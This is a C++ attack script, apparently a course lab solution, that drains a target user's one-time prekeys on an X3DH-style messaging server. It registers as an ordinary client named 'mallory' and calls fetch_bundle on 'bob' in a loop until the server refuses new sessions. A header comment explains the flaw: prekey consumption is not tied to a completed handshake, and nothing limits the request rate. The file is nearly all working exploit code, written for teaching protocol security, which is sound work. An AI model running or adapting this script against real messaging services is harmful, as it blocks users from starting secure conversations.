// attack1.cpp -- Prekey Pogo attack (one-time prekey exhaustion)
//
// Scenario (assignment_pdf.pdf, Attack 1): Bob published a prekey bundle
// (identity key + signed prekey + a batch of one-time prekeys) and went
// offline. Mallory is an ORDINARY client with no special network
// position -- just another user of the service, same as Alice.
//
// protocol.md, "One-time prekey (OPK) lifecycle":
//   "Each fetch_bundle hands out -- and consumes -- one of the target's
//    one-time prekeys... Once the inventory is empty the server refuses
//    fetch_bundle, so no new session can be started with that user until
//    they publish more prekeys."
//
// The flaw this demonstrates: OPK consumption is tied merely to calling
// fetch_bundle, not to actually completing an X3DH handshake (sending the
// first real message that uses the returned opk_id). fetch_bundle is not
// scoped to "I intend to message this user right now" in any
// authenticated/accountable way, and the lab exposes no rate limiting or
// per-requester quota on it. So any registered client can walk up and
// call fetch_bundle("bob") repeatedly -- it never needs to send Bob a
// single message -- and drain his entire OPK inventory before the
// legitimate Alice ever gets a chance. Once the inventory hits zero, the
// server refuses fetch_bundle outright: this is not just "degraded
// forward secrecy" (losing DH4), it is a full availability attack on
// session establishment with Bob until Bob reconnects and republishes.
//
// Build: see README.md / Makefile.

#include "common/json_mini.hpp"
#include "common/netutil.hpp"
#include <chrono>
#include <cstdio>
#include <cstdlib>
#include <string>
#include <thread>

struct Options {
    std::string serverHost = "as3_server";
    int serverPort = 9000;
    std::string attackerName = "mallory";
    std::string victim = "bob";
    int maxAttempts = 50;       // safety cap; OPK_COUNT default in docker-compose.yml is 5
    int intervalMs = 0;         // 0 = fire as fast as possible
};

static Options parseArgs(int argc, char** argv) {
    Options o;
    for (int i = 1; i < argc; i++) {
        std::string a = argv[i];
        auto val = [&](int& i) { return std::string(argv[++i]); };
        if (a == "--server-host") o.serverHost = val(i);
        else if (a == "--server-port") o.serverPort = std::stoi(val(i));
        else if (a == "--as") o.attackerName = val(i);
        else if (a == "--victim") o.victim = val(i);
        else if (a == "--max-attempts") o.maxAttempts = std::stoi(val(i));
        else if (a == "--interval-ms") o.intervalMs = std::stoi(val(i));
        else if (a == "--help") {
            printf("usage: attack1 [--server-host H] [--server-port P] "
                   "[--as attackerUsername] [--victim user] "
                   "[--max-attempts N] [--interval-ms N]\n");
            exit(0);
        }
    }
    return o;
}

static json::Value sendRecv(int fd, net::LineReader& reader, const json::Value& req) {
    net::sendLine(fd, json::dump(req));
    std::string line;
    if (!reader.readLine(line)) throw std::runtime_error("connection closed by server");
    return json::parse(line);
}

int main(int argc, char** argv) {
    Options o = parseArgs(argc, argv);

    int fd;
    try {
        fd = net::connectTo(o.serverHost, o.serverPort);
    } catch (std::exception& e) {
        fprintf(stderr, "fatal: %s\n", e.what());
        return 1;
    }
    net::LineReader reader(fd);

    // register as an ordinary client -- no special privilege needed.
    {
        json::Value req = json::Value::mkObj();
        req.set("type", json::Value::mkStr("register"));
        req.set("user", json::Value::mkStr(o.attackerName));
        json::Value resp = sendRecv(fd, reader, req);
        if (resp.getStr("type") != "ok") {
            fprintf(stderr, "register failed: %s\n", json::dump(resp).c_str());
            return 1;
        }
        fprintf(stderr, "[mallory] registered as '%s'\n", o.attackerName.c_str());
    }

    fprintf(stderr, "[mallory] draining one-time prekeys for '%s' (no session ever established)\n", o.victim.c_str());

    long drained = 0;
    long startCount = -1;
    for (int attempt = 1; attempt <= o.maxAttempts; attempt++) {
        json::Value req = json::Value::mkObj();
        req.set("type", json::Value::mkStr("fetch_bundle"));
        req.set("user", json::Value::mkStr(o.victim));
        json::Value resp = sendRecv(fd, reader, req);

        std::string type = resp.getStr("type");
        if (type == "err") {
            fprintf(stderr, "[mallory] attempt %d: server refused fetch_bundle (%s)"
                            " -- OPK inventory is exhausted; Alice can no longer start a session with %s\n",
                    attempt, resp.getStr("err").c_str(), o.victim.c_str());
            break;
        }
        if (type != "bundle") {
            fprintf(stderr, "[mallory] attempt %d: unexpected response: %s\n", attempt, json::dump(resp).c_str());
            break;
        }

        auto* bundle = resp.find("bundle");
        long opkId = bundle ? bundle->getInt("opk_id", 0) : 0;
        std::string opk = bundle ? bundle->getStr("opk", "") : "";
        long remaining = resp.getInt("count", -1);
        if (startCount < 0) startCount = remaining + 1; // remaining AFTER this fetch

        if (opk.empty() || opkId == 0) {
            fprintf(stderr, "[mallory] attempt %d: bundle returned with NO one-time prekey "
                            "(opk_id=0) -- inventory already empty, count=%ld\n",
                    attempt, remaining);
            break;
        }

        drained++;
        fprintf(stderr, "[mallory] attempt %d: consumed opk_id=%ld, %ld remaining (never sent %s a message)\n",
                attempt, opkId, remaining, o.victim.c_str());

        if (remaining == 0) {
            fprintf(stderr, "[mallory] inventory is now 0 -- next fetch_bundle should be refused\n");
        }
        if (o.intervalMs > 0) std::this_thread::sleep_for(std::chrono::milliseconds(o.intervalMs));
    }

    fprintf(stderr, "[mallory] done. one-time prekeys drained: %ld (started around %ld)\n", drained, startCount);
    close(fd);
    return 0;
}
